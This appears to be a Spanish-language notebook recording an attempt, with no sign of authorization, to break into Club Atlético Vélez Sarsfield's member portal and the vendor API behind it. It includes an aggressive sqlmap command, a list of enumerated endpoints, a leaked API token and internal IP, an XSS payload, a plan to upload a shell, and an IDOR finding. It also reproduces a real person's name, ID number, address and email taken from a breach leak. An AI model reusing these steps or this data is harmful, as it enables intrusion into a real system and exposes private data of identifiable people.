200.89.140.116      Estadio   ( 203 ) Pensión  -  Fuera de nuestra  LAN no tomar en cuenta 

200.89.140.117      Estadio   ( 204 )  Ecsa

200.89.140.118      Estadio   (  IMAT  )

https://clubvelez.miclub.info/login.php

sqlmap -u "[https://target.com](https://target.com/)" --dbs --level=5 --risk=3 --user-agent -v3 --tamper="between,randomcase,space2comment" --batch --dump


# clubvelez

https://clubvelez.miclub.info/login.php
https://clubvelez.miclub.info/register.php
https://clubvelez.miclub.info/api_test.php
https://clubvelez.miclub.info/ajax.php
https://clubvelez.miclub.info/config.php
https://clubvelez.miclub.info/dev.php
https://clubvelez.miclub.info/crm_nuevo.php
https://clubvelez.miclub.info/info.php
https://clubvelez.miclub.info/invitados.php
https://clubvelez.miclub.info/log.php
https://clubvelez.miclub.info/privacidad.php
https://clubvelez.miclub.info/test.php
https://clubvelez.miclub.info/thumb.php

https://clubvelez.miclub.info/reset.php
Variables:  
Array ( [config_lic_validar_remoto] => 0 [config_lic_url] => http://altademanda.erp.cleversoftsolutions.com/lic/api/ [url_orig] => ? [id_empresa] => 235 [empresa] => clubvelez [dominio_cliente] => clubvelez.miclub.info [sitio_habilitado] => 1 [empresa_nombre] => Club Atlético Vélez Sarsfield [api_url] => http://200.89.140.114:10880/api2/ [token] => AtiU86fGzhAmbjrU81NT2deRtCZkKv0M [Login_Source] => web [last_url] => /crm_nuevo.php ) https://clubvelez.miclub.info/reset.php?r=1


200.89.140.114:10880/api2/
![[Pasted image 20241021154834.png]]

api_test.php hace uso de http://200.89.140.114:10880/api2/, dicho endpoint tiene una vulnerabilidad de version disclosure
![[Pasted image 20241021160127.png]] 


"""""""exploit"""""" de mimichan encontrado

![[Pasted image 20241021180214.png]]

Resumen, desde el endpoint invitados.php se puede acceder a una "Selección del tipo de invitación" 
![[Pasted image 20241021180304.png]]

Desde acá el botón de generar link no sirve, pero desde manual podemos generar invitaciones para un partido

![[Pasted image 20241021180333.png]]

Una vez rellenamos los datos nos encontramos con la siguiente vista

![[Pasted image 20241021180512.png]]
Seleccionamos la unica opción posible y nos encontramos con la siguiente vista

![[Pasted image 20241021180657.png]]

Acá probé con el primer DNI que figura en el leak de breachforums, como para no andar gastando tiempo en fuzzear a la primera

![[Pasted image 20241021180745.png]]

Click en buscar y a simple vista solo parece que se muestra información poco sensible
![[Pasted image 20241021180815.png]]

Pero si revisamos el request figura lo siguiente

![[Pasted image 20241021180823.png]]
Con mayor detalle
![[Pasted image 20241021180837.png]]
De todas formas no coincide exactamente con la muestra del leak de mimichan
1,3788840,CONDE GONZALO JULIAN,ASPM011507,604591,,"['EMILIO MITRE 902', 'HAEDO', 'BUENOS AIRES', '39714115', '9', '', '', '2011-05-21 00:00:00.000', '', '', '', '', '41169529', 'SI        ', '23', 'grabreppe@yahoo.com.ar', '2024-09-01 00:00:00.000', '0', 'NO DEFINIDO', '3', 'Lista C']"

![[Pasted image 20241021181628.png]]

Por ahora conjeturo tres opciones posibles
Que se haya explotado lo mismo pero hubo cambios por parte de CleverSoft con respecto al ataque del que surgió el breach
La segunda es que sigue la cadena desde acá hasta llegar a a la db
La tercera es que explotaron la versión de apache que tiene CleverSoft

https://clubvelez.miclub.info/api_test.php tiene un ejemplo de request response a lo que es al parecer http://200.89.140.114:10880/api2/, dicho endpoint está corriendo los siguientes servicios 

![[Pasted image 20241021212641.png]]

Apache/2.4.38 (Win64) OpenSSL/1.0.2q PHP/5.6.40

Puede que se haya explotado dicha versión de apache a traves de HTTP Request smuggling?
Intenté hacerlo pero no tuve exito, aunque no lo exploté nunca fuera de un entorno de pruebas, puede que sea vulnerable pero tengo que seguir probando

Usando dorks encontré este endpoint que faltaba

https://clubvelez.miclub.info/nuevosocio/
Tiene que haber alguna forma de sqli acá. Aunque puede que simplemente en el back sea una concatenación de if == 1...  if == 2... etc.
![[Pasted image 20241021220033.png]]
![[Pasted image 20241021220103.png]]


Se encontró un xss en nuevosocio, al poner en campo nombre <script>alert(1)</script> se visualiza el siguiente mensaje
![[Pasted image 20241021223902.png]]



![[Pasted image 20241021224519.png]]

Intentar subir una shell acá (/nuevosocio/?paso=2)

![[Pasted image 20241021225411.png]]





Array ( [config_lic_validar_remoto] => 0 [config_lic_url] => http://altademanda.erp.cleversoftsolutions.com/lic/api/ [url_orig] => ? [id_empresa] => 235 [empresa] => clubvelez [dominio_cliente] => clubvelez.miclub.info [sitio_habilitado] => 1 [empresa_nombre] => Club Atlético Vélez Sarsfield [api_url] => http://200.89.140.114:10880/api2/ [token] => AtiU86fGzhAmbjrU81NT2deRtCZkKv0M [Login_Source] => web [last_url] => /nuevosocio/index.php [nuevosocio_validar_dni] => 1 [nuevosocio_pais] => ARG [nuevosocio_provincia] => 1 [nuevosocio_localidad] => [nuevosocio_fechanac] => 22/10/2004 [nuevosocio_edad] => 20 [nuevosocio_sexo] => M [nuevosocio_nombre] => test [nuevosocio_apellido] => test [nuevosocio_tipodoc] => DNI [nuevosocio_nrodoc] => 12345671 [nuevosocio_email] => meliwi8103@chysir.com [nuevosocio_confemail] => meliwi8103@chysir.com [nuevosocio_telefono_pre] => 011 [nuevosocio_telefono] => 12345678 [nuevosocio_tiposocio] => [nuevosocio_celular_pre] => 011 [nuevosocio_celular] => 12351235 [nuevosocio_flag_alfa] => 0 [nuevosocio_paso_1] => 1 [nuevosocio_interior] => 0 [nuevosocio_x_discapacitado] => [nuevosocio_x_nrodecredencial] => [nuevosocio_x_tipodiscapacidad] => [nuevosocio_x_obsdiscapacidad] => [nuevosocio_x_fechadevencimiento] => [nuevosocio_preciototal] => 18000 [nuevosocio_cotizacion] => [nuevosocio_categoria] => AP [nuevosocio_importe] => 18000 [nuevosocio_correo] => [nuevosocio_juramento] => 1 [nuevosocio_nombre_padre] => [nuevosocio_debito] => 1 [nuevosocio_debito_tarjeta] => 4242424242424242 [nuevosocio_debito_id_tarjeta] => 07 [nuevosocio_frente_original] => Screenshot from 2024-10-22 11-43-03.png [nuevosocio_frente] => test_frente_20241022120134_6717be4e6b079.png [nuevosocio_dorso_original] => Screenshot from 2024-10-22 11-43-03.png [nuevosocio_dorso] => test_dorso_20241022120134_6717be4e6b079.png [nuevosocio_fotoperfil_original] => Screenshot from 2024-10-22 11-43-03.png [nuevosocio_fotoperfil] => test_fotoperfil_20241022120134_6717be4e6b079.png [nuevosocio_paso_2] => 1 )



https://altademanda.erp.cleversoftsolutions.com/lic/charges.php/
![[Pasted image 20241022121153.png]]

![[Pasted image 20241022121256.png]]

# LOGEADO
### /recibos

IDOR:
![[Pasted image 20241031115355.png]]
![[Pasted image 20241031115449.png]]
